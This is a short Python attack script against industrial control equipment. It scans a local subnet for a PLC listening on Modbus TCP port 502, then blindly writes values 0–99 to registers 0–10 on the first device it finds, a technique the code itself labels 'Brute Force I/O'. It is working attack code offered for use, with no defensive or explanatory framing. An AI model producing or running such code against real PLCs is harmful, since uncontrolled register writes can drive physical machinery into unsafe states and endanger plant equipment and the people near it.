import socket
import pymodbus
from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ConnectionException

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Define the subnet to scan (e.g., 192.168.1.0/24)
    subnet = "192.168.1."
    for i in range(1, 255):
        ip = f"{subnet}{i}"
        try:
            # Attempt to connect to the Modbus TCP port (502)
            client = ModbusTcpClient(ip, port=502)
            client.connect()
            if client.is_socket_open():
                print(f"PLC found at IP: {ip}")
                client.close()
                return ip
        except ConnectionException:
            continue
    print("PLC not found in the specified subnet.")
    return None

# Function to perform Brute Force I/O
def brute_force_io(plc_ip, start_address, end_address, value_range):
    client = ModbusTcpClient(plc_ip, port=502)
    client.connect()
    
    if not client.is_socket_open():
        print("Failed to connect to the PLC.")
        return
    
    for address in range(start_address, end_address + 1):
        for value in value_range:
            try:
                # Write the value to the specified address
                result = client.write_register(address, value)
                if result.isError():
                    print(f"Failed to write value {value} to address {address}")
                else:
                    print(f"Successfully wrote value {value} to address {address}")
            except Exception as e:
                print(f"Error writing to address {address}: {e}")
    
    client.close()

# Main function
def main():
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if not plc_ip:
        return
    
    # Define the range of I/O addresses to brute force
    start_address = 0
    end_address = 10  # Example range, adjust as needed
    
    # Define the range of values to write
    value_range = range(0, 100)  # Example range, adjust as needed
    
    # Perform Brute Force I/O
    brute_force_io(plc_ip, start_address, end_address, value_range)

if __name__ == "__main__":
    main()